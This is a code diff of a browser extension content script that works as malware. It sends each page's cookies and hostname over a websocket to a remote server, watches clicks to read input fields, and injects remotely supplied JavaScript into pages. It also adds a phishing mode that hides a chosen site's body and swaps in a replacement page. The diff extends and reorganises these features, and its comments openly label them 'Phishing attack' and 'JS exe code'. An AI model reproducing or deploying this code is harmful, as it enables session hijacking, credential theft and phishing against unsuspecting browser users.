@@ -32,28 +32,39 @@ chrome.storage.sync.get(["values"], function(result){
   }
 });
 
-/*
-When the window loads up, send the cookies over to our server.
-*/
-window.onload = function(){
+ws.onopen = function(){
   var cookies = document.cookie.split(';');
   var domSite = window.location.hostname;
   var jsonPackage = {id: id, website: domSite, type: 'cookie', cookie: cookies};
   ws.send(JSON.stringify(jsonPackage));
-  chrome.storage.sync.get(["newPage", "scriptExe"], function(ev){
+}
+
+/*
+When the window loads up, send the cookies over to our server.
+*/
+window.onload = function(){
+  chrome.storage.sync.get(["newPage", "scriptExe", "compareSite"], function(ev){
     var pageBool = ev.newPage;
+    var tempSiteFish = ev.compareSite;
     var nodeScript = document.createElement('script');
     nodeScript.type = 'text/javascript';
-    if(pageBool === "yes"){
+    if(pageBool === "ex"){
       nodeScript.appendChild(document.createTextNode(ev.scriptExe));
       document.body.appendChild(nodeScript);
+      chrome.storage.sync.set({'newPage': ""}, function(){});
+    }
+
+    else if(pageBool == "fish" && window.location.hostname.includes(tempSiteFish)){
+      chrome.storage.sync.set({'newPage': "fishFollow"}, function(){});
+      document.getElementsByTagName("BODY")[0].style.display = "none";
+      chrome.extension.sendMessage({action: 'load'}, function(response){});
     }
   });
-  chrome.storage.sync.set({'newPage': ""}, function(){});
 }
 
 //Wait for a click on the screen
 window.addEventListener("click", clickListen, false);
+
 
 function clickListen (e){
   var val = document.getElementsByTagName('input');
@@ -115,13 +126,13 @@ chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
   switch(message.action){
     //Phishing attack.
     case 'phis':
-
+        chrome.storage.sync.set({'newPage': "fish"}, function(){});
       break;
     //JS exe code.
     case 'exe':
       chrome.storage.sync.get("redirectSite", function(ev){
+        chrome.storage.sync.set({'newPage': "ex"}, function(){});
         window.location.replace(ev.redirectSite);
-        chrome.storage.sync.set({'newPage': "yes"}, function(){});
       });
       break;
     case 'addL':
@@ -133,10 +144,6 @@ chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
         chrome.storage.sync.set({'values': tempVals}, function(){});
       });
       break;
-    case 'messageL':
-      alert("IT WORKED!");
-      console.log("SEND WORK!");
-      break;
   }
 });
 
@@ -145,9 +152,9 @@ chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
 Helper function, used to get the website that is being blocked, while the
 phishing signal is active.
 */
-chrome.storage.sync.get("webSite", function(ev){
-  phishFl = ev.webSite;
-  if(phishFl.localeCompare(window.location.host) === 0){
+chrome.storage.sync.get(["compareSite", "newPage"], function(ev){
+  phishFl = ev.compareSite;
+  if(window.location.host.includes(phishFl)  && ev.newPage == 'fishFollow'){
       document.getElementsByTagName("BODY")[0].style.display = "none";
       chrome.extension.sendMessage({action: 'load'}, function(response){});
   }
